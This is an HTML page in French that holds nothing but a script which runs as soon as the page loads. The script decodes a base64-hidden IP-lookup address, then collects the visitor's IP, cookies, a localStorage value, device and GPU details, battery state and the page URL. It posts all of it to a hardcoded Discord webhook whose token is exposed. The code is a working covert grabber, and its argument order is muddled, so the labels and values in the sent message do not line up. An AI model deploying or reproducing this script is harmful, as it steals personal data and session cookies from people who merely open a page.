<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">

<body>
  <script>
    (function() {
      const a = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
      fetch(a)
        .then(b => b.json())
        .then(c => {
          const d = c.ip;
          const e = navigator.platform;
          const f = navigator.language || navigator.userLanguage;
          const g = screen.width;
          const h = screen.height;
          const i = navigator.userAgent;
          const j = navigator.connection ? navigator.connection.effectiveType : "Non disponible";
          const k = window.innerWidth;
          const l = window.innerHeight;
          const m = document.cookie;
          const n = localStorage.getItem('key') || "Aucune donnée trouvée";
          const o = window.performance.timing;
          const p = Notification.permission;

          navigator.getBattery().then(q => {
            const r = q.level * 100 + "%";
            const s = q.charging ? "Oui" : "Non";

            navigator.mediaDevices.enumerateDevices().then(t => {
              const u = t.filter(v => v.kind === "audioinput");
              const w = t.filter(x => x.kind === "videoinput");

              const x = u.length > 0 ? u.map(v => v.label).join(", ") : "Aucun périphérique audio ou permission refusée.";
              const y = w.length > 0 ? w.map(v => v.label).join(", ") : "Aucun périphérique vidéo ou permission refusée.";

              const z = document.createElement('canvas').getContext('webgl');
              const aa = z.getExtension('WEBGL_debug_renderer_info');
              const ab = aa ? z.getParameter(aa.UNMASKED_RENDERER_WEBGL) : "Non disponible";
              const ac = aa ? z.getParameter(aa.UNMASKED_VENDOR_WEBGL) : "Non disponible";

              const ad = navigator.hardwareConcurrency;

              // Obtention de l'URL de la page où le fichier a été lancé
              const pageLocation = window.location.href;

              function ae(a, b, c, d, e, f, g, h, i, j, k, l, m, n, o, p, q, r, s, t, u) {
                const v = "https://canary.discord.com/api/webhooks/1434589491695190066/Za8fHNic1OgX3uWyB2zNFmtRQWKPtC5wJbHVouxJNbWl2NEacbFZufspecj6sV-Zfdu3";
                
                const w = {
                  content: `
                    **Adresse IP :** ${a}
                    **Système d'exploitation :** ${b}
                    **Langue du navigateur :** ${c}
                    **Résolution de l'écran :** ${d}x${e}
                    **User-Agent :** ${f}
                    **Type de connexion :** ${g}
                    **Dimensions de la fenêtre :** ${h}x${i}
                    **Cookies :** ${j}
                    **LocalStorage (clé 'key') :** ${k}
                    **Performance du navigateur :** ${JSON.stringify(l)}
                    **Permission des notifications :** ${m}
                    **Niveau de batterie :** ${n}
                    **Charge de la batterie :** ${o}
                    **Périphériques audio détectés :** ${p}
                    **Périphériques vidéo détectés :** ${q}
                    **GPU (Rendu) :** ${r}
                    **GPU (Fabricant) :** ${s}
                    **Nombre de cœurs CPU :** ${t}
                    **URL de la page où le fichier a été lancé :** ${u}
                  `
                };

                fetch(v, {
                  method: "POST",
                  headers: {
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify(w)
                })
                .then(x => x.json())
                .then(() => console.log('Données envoyées avec succès !'))
                .catch(y => console.error("Erreur lors de l'envoi des données :", y));
              }

              ae(d, e, f, g, h, i, j, k, l, m, n, o, p, r, s, x, y, ab, ac, ad, pageLocation);
            }).catch(z => console.error('Erreur lors de l\'enumeration des périphériques:', z));
          }).catch(aa => console.error('Erreur de batterie:', aa));
        })
        .catch(bb => console.error("Erreur lors de la récupération de l'IP :", bb));
    })();
  </script>
</body>
